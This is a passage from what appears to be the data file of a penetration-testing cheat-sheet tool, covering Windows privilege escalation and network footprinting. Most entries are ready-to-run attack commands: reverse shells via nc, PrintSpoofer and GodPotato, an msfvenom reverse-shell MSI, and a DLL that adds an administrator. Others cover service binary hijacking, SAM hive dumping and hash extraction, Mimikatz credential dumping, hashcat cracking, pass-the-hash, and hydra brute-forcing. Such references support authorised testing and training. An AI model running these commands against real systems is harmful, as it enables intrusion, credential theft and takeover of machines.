              { id: 'wpcu3', label: 'Decode base64 password from unattend.xml', os: 'Windows', command: '[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("BASE64_HASH_HERE"))', notes: 'Passwords in unattend.xml may be stored as base64-encoded Unicode strings.' },
            ],
          },
          {
            id: 'wpe-clf',
            name: 'Credentials from Log Files',
            commands: [
              { id: 'wpcl1', label: 'Search IIS logs for credentials', os: 'Windows', command: "Get-ChildItem -Path C:\\inetpub\\logs -Recurse -Filter '*.log' -ErrorAction SilentlyContinue | Select-String -Pattern 'password|pass=|pwd=|Authorization' | Select-Object -First 50", notes: 'Credentials submitted in GET parameters appear in plaintext in IIS logs.' },
              { id: 'wpcl2', label: 'Search Apache/XAMPP logs', os: 'Windows', command: "Get-ChildItem -Path C:\\xampp\\apache\\logs,C:\\wamp\\logs -Recurse -Filter '*.log' -ErrorAction SilentlyContinue | Select-String -Pattern 'pass|pwd|token' | Select-Object -First 50", notes: '' },
              { id: 'wpcl3', label: 'Windows event log — failed logins (attacker box)', os: 'Linux', command: "python3 /opt/impacket/examples/lookupsid.py '$$DOMAIN/$$USER:$$PASSWORD'@$$IP", notes: '' },
              { id: 'wpcl4', label: 'Search temp and debug log files', os: 'Windows', command: "Get-ChildItem -Path $env:TEMP,C:\\Windows\\Temp,C:\\Temp -Recurse -Include *.log,*.txt -ErrorAction SilentlyContinue | Select-String -Pattern 'password|passwd|secret' | Select-Object -First 30", notes: 'Applications frequently write credentials to temp/debug logs during installation or crashes.' },
            ],
          },
          {
            id: 'wpe-cgrp',
            name: 'User Groups',
            commands: [
              { id: 'wpcg1', label: 'Current user identity and groups', os: 'Windows', command: 'whoami /all', notes: 'Shows username, SID, groups, and privileges in one shot. Most important first check.' },
              { id: 'wpcg2', label: 'List local groups', os: 'Windows', command: 'net localgroup', notes: '' },
              { id: 'wpcg3', label: 'List local Administrators group', os: 'Windows', command: 'net localgroup Administrators', notes: '' },
              { id: 'wpcg4', label: 'Dangerous group membership checks', os: 'Windows', command: '# Check for high-value groups:\nnet localgroup "Backup Operators"\nnet localgroup "Remote Desktop Users"\nnet localgroup "Event Log Readers"\nnet localgroup "DnsAdmins"', notes: 'Backup Operators can read any file (backup privilege). DnsAdmins can load a DLL into DNS service (SYSTEM). Event Log Readers can read security logs.' },
            ],
          },
        ],
      },

      /* ── Exploit ────────────────────────────────────────────────────────── */
      {
        id: 'wpe-exploit',
        name: 'Exploit',
        description: 'Exploit vulnerable software — OS, local services, or installed applications — to gain SYSTEM.',
        tags: ['windows', 'privesc', 'exploit'],
        subtechniques: [
          {
            id: 'wpe-esvc',
            name: 'Services Running on Localhost',
            commands: [
              { id: 'wpel1', label: 'List localhost-only TCP listeners', os: 'Windows', command: 'netstat -ano | findstr "127.0.0.1"', notes: 'Services bound to 127.0.0.1 are not exposed externally but reachable from the compromised host.' },
              { id: 'wpel2', label: 'All listening sockets with PID', os: 'Windows', command: 'netstat -ano | findstr "LISTENING"', notes: '' },
              { id: 'wpel3', label: 'Map PID to process name', os: 'Windows', command: 'Get-Process | Where-Object { $_.Id -eq $$PID } | Select-Object Name,Id,Path', notes: 'Replace $$PID with the PID from netstat to identify what is listening.' },
              { id: 'wpel4', label: 'Probe localhost HTTP service', os: 'Windows', command: 'Invoke-WebRequest -Uri "http://127.0.0.1:$$PORT/" -UseBasicParsing | Select-Object StatusCode,Content', notes: 'Admin panels and REST APIs running on localhost are common privilege escalation vectors.' },
            ],
          },
          {
            id: 'wpe-eker',
            name: 'Kernel Version',
            commands: [
              { id: 'wpek1', label: 'Get OS version and build', os: 'Windows', command: 'systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix"', notes: '' },
              { id: 'wpek2', label: 'Windows Exploit Suggester — Next Generation (WES-NG)', os: 'Linux', command: '# On target:\nsysteminfo > C:\\Temp\\sysinfo.txt\n\n# Transfer to attacker machine, then:\npython3 wes.py --update\npython3 wes.py sysinfo.txt --impact "Elevation of Privilege"', notes: 'WES-NG cross-references installed patches against CVE database. https://github.com/bitsadmin/wesng' },
              { id: 'wpek3', label: 'List missing hotfixes', os: 'Windows', command: 'Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 20\nwmic qfe list brief /format:table', notes: 'Check the last hotfix date — machines with old patch dates are likely vulnerable to known public exploits.' },
              { id: 'wpek4', label: 'MS16-032 / MS15-051 quick check', os: 'Windows', command: '# MS16-032 (Token Kidnapping) — 2008R2/7 x64, 2012R1 x64:\n# Requires 2+ CPU cores\n[Environment]::ProcessorCount\nsysteminfo | findstr /C:"OS Version"\n# CVE-2021-36934 (HiveNightmare) — Win10 21H1 and earlier:\nicacls C:\\Windows\\System32\\config\\SAM', notes: '' },
            ],
          },
          {
            id: 'wpe-eswv',
            name: 'Software Versions',
            commands: [
              { id: 'wpesw1', label: 'List installed software (registry)', os: 'Windows', command: 'Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* |\nSelect-Object DisplayName,DisplayVersion,Publisher,InstallDate |\nSort-Object DisplayName | Format-Table -AutoSize', notes: '' },
              { id: 'wpesw2', label: 'List installed software (32-bit apps)', os: 'Windows', command: 'Get-ItemProperty "HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*" |\nSelect-Object DisplayName,DisplayVersion,Publisher | Sort-Object DisplayName', notes: '' },
              { id: 'wpesw3', label: 'Check for common vulnerable software', os: 'Windows', command: "# Look for old versions of:\nGet-Command java 2>$null | Select-Object -ExpandProperty Version\nGet-Command python 2>$null | Select-Object -ExpandProperty Version\n(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full').Release", notes: '' },
              { id: 'wpesw4', label: 'searchsploit Windows software (attacker box)', os: 'Linux', command: 'searchsploit "$$SOFTWARE_NAME $$VERSION local privilege"', notes: 'Run from your attacker machine. Replace $$SOFTWARE_NAME and $$VERSION with findings from target.' },
            ],
          },
          {
            id: 'wpe-esvc2',
            name: 'Service Versions',
            commands: [
              { id: 'wpesv1', label: 'List all running services with binary paths', os: 'Windows', command: 'Get-WmiObject Win32_Service | Where-Object { $_.State -eq "Running" } | Select-Object Name,DisplayName,PathName,StartMode | Format-List', notes: '' },
              { id: 'wpesv2', label: 'Get binary version for a specific service', os: 'Windows', command: '(Get-Item "C:\\path\\to\\service.exe").VersionInfo | Select-Object ProductName,FileVersion,ProductVersion', notes: '' },
              { id: 'wpesv3', label: 'IIS version', os: 'Windows', command: '[System.Diagnostics.FileVersionInfo]::GetVersionInfo("$env:SystemRoot\\system32\\inetsrv\\iis.dll").FileVersion', notes: '' },
              { id: 'wpesv4', label: 'Check PrintSpooler (Spooler service) running', os: 'Windows', command: 'Get-Service Spooler | Select-Object Status,StartType\n# If running + SeImpersonatePrivilege → PrintNightmare / PrintSpoofer attack vector', notes: 'SpoolSS service is required for PrintSpoofer / PrintNightmare (CVE-2021-1675) exploitation.' },
            ],
          },
        ],
      },

      /* ── Misconfiguration ───────────────────────────────────────────────── */
      {
        id: 'wpe-misc',
        name: 'Misconfiguration',
        description: 'Abuse Windows misconfigurations — weak service permissions, token privileges, scheduled tasks, DLL hijacking, and registry settings.',
        tags: ['windows', 'privesc', 'misconfiguration'],
        subtechniques: [
          {
            id: 'wpe-mpriv',
            name: 'User Privileges',
            commands: [
              { id: 'wpmp1', label: 'Check current privileges', os: 'Windows', command: 'whoami /priv', notes: 'Key dangerous privileges: SeImpersonatePrivilege, SeAssignPrimaryToken, SeDebugPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege.' },
              { id: 'wpmp2', label: 'SeImpersonatePrivilege → PrintSpoofer', os: 'Windows', command: '.\\PrintSpoofer64.exe -i -c cmd.exe\n# Or with nc reverse shell:\n.\\PrintSpoofer64.exe -c "C:\\Temp\\nc.exe $$LHOST $$LPORT -e cmd.exe"', notes: 'SeImpersonate is held by most service accounts (IIS, MSSQL, etc.). PrintSpoofer works on Server 2019/Win10. https://github.com/itm4n/PrintSpoofer' },
              { id: 'wpmp3', label: 'SeImpersonatePrivilege → GodPotato', os: 'Windows', command: '.\\GodPotato.exe -cmd "cmd /c whoami"\n.\\GodPotato.exe -cmd "cmd /c C:\\Temp\\nc.exe $$LHOST $$LPORT -e cmd.exe"', notes: 'GodPotato works on all Windows versions Server 2012–2022 with SeImpersonatePrivilege. https://github.com/BeichenDream/GodPotato' },
              { id: 'wpmp4', label: 'SeDebugPrivilege → token duplication from LSASS', os: 'Windows', command: '# Migrate into or dump token from a SYSTEM process\n# With meterpreter:\ngetsystem\n# With Mimikatz (requires SeDebugPrivilege):\nprivilege::debug\nsekurlsa::logonpasswords', notes: 'SeDebugPrivilege lets you open any process — including LSASS — for reading or code injection.' },
              { id: 'wpmp5', label: 'SeBackupPrivilege → read any file', os: 'Windows', command: '# Python-based (Backup Operators member)\n# Copy SAM and SYSTEM:\nreg save HKLM\\SAM C:\\Temp\\SAM\nreg save HKLM\\SYSTEM C:\\Temp\\SYSTEM\n# Then dump offline with secretsdump', notes: 'SeBackupPrivilege lets you read any file regardless of ACLs when opened with BACKUP_READ flag.' },
            ],
          },
          {
            id: 'wpe-msvc',
            name: 'Services',
            commands: [
              { id: 'wpms1', label: 'Find services current user can configure (accesschk)', os: 'Windows', command: '.\\accesschk64.exe -uwcv "$$USER" * /accepteula 2>$null\n# Or check Everyone / Users:\n.\\accesschk64.exe -uwcv Everyone * /accepteula 2>$null', notes: 'accesschk from Sysinternals. Look for SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS. https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk' },
              { id: 'wpms2', label: 'Check service permissions with sc sdshow', os: 'Windows', command: 'sc sdshow $$SERVICE_NAME', notes: 'Decode with SDDL reference. RP=start, WP=stop, CC=query config, DC=change config, LC=query status.' },
              { id: 'wpms3', label: 'PowerUp — find all service misconfigs automatically', os: 'Windows', command: '. .\\PowerUp.ps1\nInvoke-AllChecks', notes: 'PowerUp checks unquoted paths, modifiable service binaries, weak service DACLs, AlwaysInstallElevated, etc. https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1' },
              { id: 'wpms4', label: 'WinPEAS — full automated Windows privesc sweep', os: 'Windows', command: '.\\winPEASx64.exe 2>$null | Tee-Object -FilePath C:\\Temp\\winpeas.txt', notes: 'Most comprehensive automated check. Covers all service, registry, credential, and scheduled task vectors. https://github.com/peass-ng/PEASS-ng' },
            ],
          },
          {
            id: 'wpe-muq',
            name: 'Unquoted Service Path',
            commands: [
              { id: 'wpmuq1', label: 'Find unquoted service paths', os: 'Windows', command: 'Get-WmiObject Win32_Service | Where-Object {\n  $_.PathName -notlike \'"\' + "*" + \'"\' -and\n  $_.PathName -match " " -and\n  $_.PathName -notmatch "^svchost"\n} | Select-Object Name,StartMode,State,PathName | Format-List', notes: '' },
              { id: 'wpmuq2', label: 'Find unquoted paths via WMIC', os: 'Windows', command: 'wmic service get name,displayname,pathname,startmode | findstr /iv "C:\\Windows\\\\" | findstr /iv """', notes: 'Simpler one-liner. Excludes Windows-native services and properly quoted paths.' },
              { id: 'wpmuq3', label: 'Check writable directory in the path', os: 'Windows', command: '# For path: C:\\Program Files\\Some App\\v1.2\\service.exe\n# Windows tries: C:\\Program.exe, C:\\Program Files\\Some.exe, C:\\Program Files\\Some App\\v1.2\\service.exe\n# Check if writable:\nicacls "C:\\Program Files\\Some App" | findstr /i "(W) (F) (M) Everyone Users"', notes: '' },
              { id: 'wpmuq4', label: 'Place malicious binary and restart service', os: 'Windows', command: '# Copy payload to the hijack path:\ncopy C:\\Temp\\evil.exe "C:\\Program Files\\Some.exe"\n# Restart service (if permissions allow):\nsc stop VulnerableService\nsc start VulnerableService', notes: 'Name your payload binary to match the ambiguous path segment Windows will try first.' },
            ],
          },
          {
            id: 'wpe-mcb',
            name: 'Change Service Binary Location',
            commands: [
              { id: 'wpmcb1', label: 'Check if service config is changeable', os: 'Windows', command: '.\\accesschk64.exe -uwcqv "$$USER" $$SERVICE_NAME /accepteula', notes: 'Need SERVICE_CHANGE_CONFIG or GENERIC_WRITE on the service object.' },
              { id: 'wpmcb2', label: 'Change service binary path to payload', os: 'Windows', command: 'sc config $$SERVICE_NAME binpath= "C:\\Temp\\evil.exe"\nsc stop $$SERVICE_NAME\nsc start $$SERVICE_NAME', notes: 'The space after binpath= is required. The service starts your binary as SYSTEM if it was running as SYSTEM.' },
              { id: 'wpmcb3', label: 'Add local admin via service binary change', os: 'Windows', command: 'sc config $$SERVICE_NAME binpath= "cmd /c net localgroup administrators $$USER /add"\nsc stop $$SERVICE_NAME; sc start $$SERVICE_NAME\n# Restore after:\nsc config $$SERVICE_NAME binpath= "C:\\original\\path\\service.exe"', notes: '' },
            ],
          },
          {
            id: 'wpe-mob',
            name: 'Overwrite Service Binary',
            commands: [
              { id: 'wpmow1', label: 'Check service binary file permissions', os: 'Windows', command: 'icacls "C:\\path\\to\\service.exe"', notes: 'Look for (W), (F), or (M) for current user, Everyone, or Users group. Any write access is exploitable.' },
              { id: 'wpmow2', label: 'Find all service binaries writable by current user', os: 'Windows', command: 'Get-WmiObject Win32_Service | ForEach-Object {\n  $path = ($_.PathName -replace \'"\',\'\').Trim() -split " " | Select-Object -First 1\n  if (Test-Path $path) {\n    $acl = Get-Acl $path -ErrorAction SilentlyContinue\n    $acl.Access | Where-Object { $_.FileSystemRights -match "Write|FullControl" -and $_.IdentityReference -match "$env:USERNAME|Everyone|Users" } |\n    ForEach-Object { [PSCustomObject]@{ Service=$_._.Name; Path=$path; Rights=$_.FileSystemRights; Identity=$_.IdentityReference } }\n  }\n}', notes: '' },
              { id: 'wpmow3', label: 'Overwrite binary and restart service', os: 'Windows', command: '# Backup original:\ncopy "C:\\path\\to\\service.exe" "C:\\Temp\\service.exe.bak"\n# Overwrite:\ncopy /Y C:\\Temp\\evil.exe "C:\\path\\to\\service.exe"\nsc stop $$SERVICE_NAME\nsc start $$SERVICE_NAME', notes: 'Restore the original binary after escalation to avoid detection/service disruption.' },
            ],
          },
          {
            id: 'wpe-mdll',
            name: 'DLL Hijacking',
            commands: [
              { id: 'wpmdll1', label: 'Find missing DLLs loaded by elevated processes (Procmon)', os: 'Windows', command: '# Run Procmon (Sysinternals) on target as low-priv user.\n# Filter: Process Name = TargetApp.exe, Path ends with .dll, Result = NAME NOT FOUND\n# Any missing DLL in a writable directory is a hijack opportunity.', notes: '' },
              { id: 'wpmdll2', label: 'Check DLL search order directories for writability', os: 'Windows', command: 'icacls "C:\\Program Files\\VulnerableApp\\" | findstr /i "(W) (F) (M) Everyone Users Authenticated"', notes: 'Windows DLL search order: application dir → System32 → System → Windows → CWD → PATH dirs. App dir is most useful — writable app dir + missing DLL = hijack.' },
              { id: 'wpmdll3', label: 'Minimal DLL template (compile on attacker box)', os: 'Linux', command: 'cat > evil_dll.c << \'EOF\'\n#include <windows.h>\nBOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {\n  if (fdwReason == DLL_PROCESS_ATTACH) {\n    system("cmd.exe /c net localgroup administrators $$USER /add");\n  }\n  return TRUE;\n}\nEOF\nx86_64-w64-mingw32-gcc -shared -o evil.dll evil_dll.c', notes: 'Cross-compile on Linux for Windows. Replace the system() call with your preferred payload.' },
              { id: 'wpmdll4', label: 'Place DLL and trigger', os: 'Windows', command: '# Copy compiled DLL to the writable app directory:\ncopy C:\\Temp\\evil.dll "C:\\Program Files\\VulnerableApp\\missing.dll"\n# Trigger: restart the service or wait for the application to reload', notes: '' },
            ],
          },
          {
            id: 'wpe-maie',
            name: 'AlwaysInstallElevated Set in Registry',
            commands: [
              { id: 'wpmie1', label: 'Check AlwaysInstallElevated keys', os: 'Windows', command: 'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated', notes: 'Exploitable only if BOTH keys are set to 1 (0x1). If only one is set it does nothing.' },
              { id: 'wpmie2', label: 'Generate malicious MSI (attacker box)', os: 'Linux', command: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=$$LHOST LPORT=$$LPORT -f msi -o evil.msi', notes: '' },
              { id: 'wpmie3', label: 'Install MSI as elevated (no UAC prompt)', os: 'Windows', command: 'msiexec /quiet /qn /i C:\\Temp\\evil.msi', notes: '/quiet and /qn suppress all UI. The MSI runs as SYSTEM because AlwaysInstallElevated elevates all .msi installs.' },
            ],
          },
          {
            id: 'wpe-mst',
            name: 'Scheduled Tasks',
            commands: [
              { id: 'wpmst1', label: 'List all scheduled tasks with run-as user', os: 'Windows', command: 'schtasks /query /fo LIST /v | findstr /i "Task Name\|Run As User\|Task To Run\|Status"', notes: 'Look for tasks running as SYSTEM or Administrator that execute a binary you can write.' },
              { id: 'wpmst2', label: 'PowerShell — list tasks running as SYSTEM', os: 'Windows', command: 'Get-ScheduledTask | Where-Object { $_.Principal.UserId -eq "SYSTEM" -or $_.Principal.RunLevel -eq "Highest" } | Select-Object TaskName,TaskPath,@{n="Action";e={$_.Actions.Execute}} | Format-List', notes: '' },
              { id: 'wpmst3', label: 'Check permissions on scheduled task binary', os: 'Windows', command: 'icacls "C:\\path\\to\\scheduled_task_binary.exe"', notes: 'If current user or Users group has write access to the binary → overwrite with payload.' },
              { id: 'wpmst4', label: 'Create new elevated scheduled task (if allowed)', os: 'Windows', command: 'schtasks /create /tn "UpdateTask" /sc once /st 00:00 /ru SYSTEM /tr "C:\\Temp\\evil.exe"\nschtasks /run /tn "UpdateTask"', notes: 'Only works if current user has permission to create scheduled tasks. Uncommon but possible on some configurations.' },
            ],
          },
          {
            id: 'wpe-mew',
            name: 'Executable File Writable',
            commands: [
              { id: 'wpmew1', label: 'Check writability of all service/task executables', os: 'Windows', command: 'Get-WmiObject Win32_Service | ForEach-Object {\n  $p = ($_.PathName -replace \'"\',\'\') -split " " | Select-Object -First 1\n  if ($p -and (Test-Path $p)) { icacls $p | Select-String "(W)|(F)|(M)" | ForEach-Object { "$p : $_" } }\n}', notes: '' },
              { id: 'wpmew2', label: 'accesschk — find writable executables in Program Files', os: 'Windows', command: '.\\accesschk64.exe -uwf "$$USER" "C:\\Program Files\\" /accepteula\n.\\accesschk64.exe -uwf "Everyone" "C:\\Program Files\\" /accepteula', notes: '' },
              { id: 'wpmew3', label: 'Overwrite binary and trigger execution', os: 'Windows', command: '# Backup first:\ncopy "C:\\path\\vuln.exe" "C:\\Temp\\vuln.exe.bak"\n# Overwrite:\ncopy /Y C:\\Temp\\evil.exe "C:\\path\\vuln.exe"\n# Trigger: restart service or wait for scheduled task', notes: '' },
            ],
          },
          {
            id: 'wpe-mdw',
            name: 'Dependency Writable',
            commands: [
              { id: 'wpmdw1', label: 'Find loaded DLLs for a SYSTEM-level process', os: 'Windows', command: '$proc = Get-Process $$PROCESS_NAME\n$proc.Modules | Select-Object ModuleName,FileName | Format-List', notes: 'If any loaded DLL lives in a writable directory → overwrite with malicious DLL.' },
              { id: 'wpmdw2', label: 'Check DLL file write permissions', os: 'Windows', command: 'icacls "C:\\path\\to\\loaded.dll"\n.\\accesschk64.exe -uwf "$$USER" "C:\\path\\to\\loaded.dll" /accepteula', notes: '' },
              { id: 'wpmdw3', label: 'Monitor DLL loads with Procmon filter', os: 'Windows', command: '# Procmon filter settings:\n# Operation = Load Image\n# Path ends with .dll\n# Process = target SYSTEM process\n# Look for DLLs loaded from writable locations', notes: '' },
            ],
          },
          {
            id: 'wpe-msfr',
            name: 'Sensitive Files Readable',
            commands: [
              { id: 'wpmsfr1', label: 'Check SAM/SYSTEM/SECURITY file permissions', os: 'Windows', command: 'icacls C:\\Windows\\System32\\config\\SAM\nicacls C:\\Windows\\System32\\config\\SYSTEM\nicacls C:\\Windows\\System32\\config\\SECURITY', notes: 'CVE-2021-36934 (HiveNightmare/SeriousSAM) — Win10 21H2 and earlier exposed SAM to all users.' },
              { id: 'wpmsfr2', label: 'Find readable files owned by privileged users', os: 'Windows', command: 'Get-ChildItem -Path C:\\Users\\Administrator,C:\\Users\\admin -Recurse -ErrorAction SilentlyContinue | Where-Object { !$_.PSIsContainer } | ForEach-Object { $acl = Get-Acl $_.FullName; if ($acl.Access | Where-Object { $_.IdentityReference -match "Users|Everyone|$$USER" -and $_.FileSystemRights -match "Read|FullControl" }) { $_.FullName } }', notes: '' },
              { id: 'wpmsfr3', label: 'Check for readable backup files in common paths', os: 'Windows', command: 'Get-ChildItem -Path C:\\ -Recurse -Include *.bak,*.backup,*.old,ntds.dit,SAM,SYSTEM -ErrorAction SilentlyContinue | Select-Object FullName,Length,LastWriteTime', notes: 'ntds.dit and SAM backups are high-value targets. If readable → offline hash extraction.' },
            ],
          },
          {
            id: 'wpe-msam',
            name: 'SAM Hive',
            commands: [
              { id: 'wpmsam1', label: 'Check live SAM accessibility (HiveNightmare)', os: 'Windows', command: 'icacls C:\\Windows\\System32\\config\\SAM\n# Vulnerable if output contains: BUILTIN\\Users:(I)(RX)', notes: 'CVE-2021-36934 — Windows 10 versions prior to November 2021 patch exposed SAM to unprivileged users.' },
              { id: 'wpmsam2', label: 'Dump SAM hive with reg save', os: 'Windows', command: 'reg save HKLM\\SAM C:\\Temp\\SAM.save\nreg save HKLM\\SYSTEM C:\\Temp\\SYSTEM.save\nreg save HKLM\\SECURITY C:\\Temp\\SECURITY.save', notes: 'Requires administrative rights or SeBackupPrivilege. Transfer files to attacker machine for offline cracking.' },
              { id: 'wpmsam3', label: 'Extract hashes from SAM + SYSTEM (attacker box)', os: 'Linux', command: 'python3 /opt/impacket/examples/secretsdump.py -sam SAM.save -system SYSTEM.save LOCAL', notes: '' },
              { id: 'wpmsam4', label: 'HiveNightmare — dump SAM as low-priv user (CVE-2021-36934)', os: 'Windows', command: '# Copy shadow copy of SAM:\nvssadmin list shadows\n# Use a shadow copy path:\ncopy "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM" C:\\Temp\\SAM_shadow\ncopy "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM" C:\\Temp\\SYSTEM_shadow', notes: '' },
            ],
          },
          {
            id: 'wpe-msys',
            name: 'SYSTEM Hive',
            commands: [
              { id: 'wpmsys1', label: 'Save SYSTEM hive', os: 'Windows', command: 'reg save HKLM\\SYSTEM C:\\Temp\\SYSTEM.save', notes: 'The SYSTEM hive contains the boot key needed to decrypt password hashes stored in the SAM hive.' },
              { id: 'wpmsys2', label: 'Extract local hashes from SAM + SYSTEM', os: 'Linux', command: 'python3 /opt/impacket/examples/secretsdump.py -sam C:\\Temp\\SAM.save -system C:\\Temp\\SYSTEM.save LOCAL', notes: '' },
              { id: 'wpmsys3', label: 'Crack NTLM hashes (hashcat)', os: 'Linux', command: 'hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt\n# With rules:\nhashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule', notes: 'NTLM hashes (-m 1000) crack extremely fast. rockyou + best64 rules covers the majority of common passwords.' },
              { id: 'wpmsys4', label: 'Pass-the-Hash with extracted NTLM', os: 'Linux', command: 'python3 /opt/impacket/examples/psexec.py -hashes ":$$NTLM_HASH" Administrator@$$IP\npython3 /opt/impacket/examples/wmiexec.py -hashes ":$$NTLM_HASH" Administrator@$$IP', notes: 'No need to crack — NTLM hashes can be used directly for authentication via PtH.' },
            ],
          },
        ],
      },
    ],
  },

  /* ── 17. Footprinting ───────────────────────────────────────────────────── */
  {
    id: 'footprinting',
    name: 'Footprinting',
    icon: '👣',
    techniques: [
      {
        id: 'fp-principles',
        name: 'Enumeration Principles',
        description: 'Core methodology: enumerate infrastructure, then services, then hosts. The goal is to understand the attack surface before exploiting it.',
        tags: ['methodology', 'enumeration', 'osint'],
        commands: [
          { id: 'fpp1', label: 'WHOIS lookup', os: 'Linux', command: 'whois $$DOMAIN', notes: 'Registrant, nameservers, contact info.' },
          { id: 'fpp2', label: 'ASN / netblock lookup', os: 'Linux', command: 'whois -h whois.cymru.com " -v $$IP"', notes: 'Identify the ASN and org owning the IP.' },
          { id: 'fpp3', label: 'BGP Toolkit (online)', os: 'Any', command: 'https://bgp.he.net/ip/$$IP', notes: 'Hurricane Electric BGP toolkit — ASN, peers, prefixes.' },
          { id: 'fpp4', label: 'Shodan search', os: 'Any', command: 'shodan search hostname:$$DOMAIN', notes: 'Find exposed services in Shodan.' },
          { id: 'fpp5', label: 'Certificate transparency', os: 'Any', command: 'curl -s "https://crt.sh/?q=$$DOMAIN&output=json" | jq ".[].name_value" | sort -u', notes: 'Find subdomains from SSL cert logs.' },
          { id: 'fpp6', label: 'theHarvester', os: 'Linux', command: 'theHarvester -d $$DOMAIN -l 500 -b all', notes: 'Harvest emails, subdomains, hosts, employee names.' },
        ],
      },
      {
        id: 'fp-infra',
        name: 'Infrastructure-Based Enumeration',
        description: 'Enumerate DNS infrastructure, virtual hosts, cloud assets, and public-facing services.',
        tags: ['dns', 'vhost', 'cloud', 'enumeration'],
        commands: [
          { id: 'fpi1', label: 'DNS brute (subfinder)', os: 'Linux', command: 'subfinder -d $$DOMAIN -v', notes: 'Fast passive subdomain enumeration.' },
          { id: 'fpi2', label: 'DNS brute (amass)', os: 'Linux', command: 'amass enum -d $$DOMAIN', notes: 'Comprehensive subdomain discovery.' },
          { id: 'fpi3', label: 'Reverse DNS lookup', os: 'Linux', command: 'for i in $(seq 1 254); do host $$IP.$i; done | grep -v "not found"', notes: 'Enumerate PTR records for a /24.' },
          { id: 'fpi4', label: 'Virtual host fuzz', os: 'Linux', command: 'gobuster vhost -u http://$$IP -w $$WORDLIST', notes: 'Find vhosts not in DNS.' },
          { id: 'fpi5', label: 'Cloud asset check (S3)', os: 'Linux', command: 'aws s3 ls s3://$$DOMAIN --no-sign-request', notes: 'Check for public S3 buckets.' },
          { id: 'fpi6', label: 'Wayback Machine URLs', os: 'Linux', command: 'curl -s "http://web.archive.org/cdx/search/cdx?url=*.$$DOMAIN/*&output=text&fl=original&collapse=urlkey" | sort -u', notes: 'Historical URLs — may reveal old endpoints.' },
        ],
      },
      {
        id: 'fp-ftp',
        name: 'FTP (Port 21)',
        description: 'Enumerate FTP service: version, anonymous login, file listing, and config disclosure.',
        tags: ['ftp', 'enumeration', 'protocol'],
                subtechniques: [
          {
            id: "ftp-disc",
            name: "Discovery & Auth",
            commands: [
            { id: "ftp1", label: "Nmap FTP scripts", os: "Linux", command: "nmap -sV -sC -p 21 $$IP", notes: "Banner grab and default scripts (anon login, bounce, etc.)." },
            { id: "ftp2", label: "Anonymous login test", os: "Linux", command: "ftp $$IP\nusername: anonymous\npassword: anonymous", notes: "Try anonymous:anonymous or anonymous:<blank>." },
            { id: "ftp3", label: "List files (anon)", os: "Linux", command: "ftp -n $$IP <<EOF\nquote USER anonymous\nquote PASS anonymous\nls -la\nEOF", notes: "Non-interactive anonymous FTP listing." }
            ]
          },
          {
            id: "ftp-exp",
            name: "Exploitation & Brute",
            commands: [
            { id: "ftp4", label: "Download all files (wget)", os: "Linux", command: "wget -m --no-passive ftp://anonymous:anonymous@$$IP/", notes: "Mirror the entire FTP site locally." },
            { id: "ftp5", label: "Banner grab (nc)", os: "Linux", command: "nc -nv $$IP 21", notes: "Raw banner — reveals vsftpd/ProFTPD/etc version." },
            { id: "ftp6", label: "Brute force FTP (hydra)", os: "Linux", command: "hydra -l $$USER -P $$WORDLIST ftp://$$IP", notes: "" },
            { id: "ftp7", label: "NSE scripts (all)", os: "Linux", command: "nmap --script ftp-* -p 21 $$IP", notes: "Run all FTP NSE scripts." }
            ]
          }
        ],
      },
      {
        id: 'fp-smb',
        name: 'SMB (Ports 445/139)',
        description: 'Enumerate SMB: OS, shares, users, sessions, and vulnerabilities.',
        tags: ['smb', 'windows', 'enumeration'],
                subtechniques: [
          {
            id: "fsmb-disc",
            name: "Discovery & Recon",
            commands: [
            { id: "fsmb1", label: "Nmap SMB scripts", os: "Linux", command: "nmap -sV -sC -p 445 $$IP", notes: "" },
            { id: "fsmb2", label: "SMB version / OS", os: "Linux", command: "nmap --script smb-os-discovery -p 445 $$IP", notes: "" },
            { id: "fsmb3", label: "SMB vuln check", os: "Linux", command: "nmap --script smb-vuln* -p 445 $$IP", notes: "Check EternalBlue (MS17-010) and others." },
            { id: "fsmb4", label: "List shares (anonymous)", os: "Linux", command: "smbclient -L //$$IP/ -N", notes: "-N = no password / null session." }
            ]
          },
          {
            id: "fsmb-shr",
            name: "Share Enumeration",
            commands: [
            { id: "fsmb5", label: "enum4linux-ng", os: "Linux", command: "enum4linux-ng -A $$IP", notes: "Full enumeration: users, shares, policies, groups." },
            { id: "fsmb6", label: "List shares (CME)", os: "Linux", command: "crackmapexec smb $$IP --shares -u \"\" -p \"\"", notes: "" },
            { id: "fsmb7", label: "Connect to share", os: "Linux", command: "smbclient //$$IP/$$SHARE -U $$USER%$$PASSWORD", notes: "" },
            { id: "fsmb8", label: "Spider share (CME)", os: "Linux", command: "crackmapexec smb $$IP -u $$USER -p $$PASSWORD -M spider_plus", notes: "Recursively list all files on all shares." },
            { id: "fsmb9", label: "SMBMap", os: "Linux", command: "smbmap -H $$IP -u $$USER -p $$PASSWORD -R", notes: "Map share permissions recursively." }
            ]
          }
        ],
      },
      {
        id: 'fp-ldap',
        name: 'LDAP (Port 389/636)',
        description: 'Enumerate Active Directory and directory services via LDAP.',
        tags: ['ldap', 'active-directory', 'windows', 'enumeration'],
        commands: [
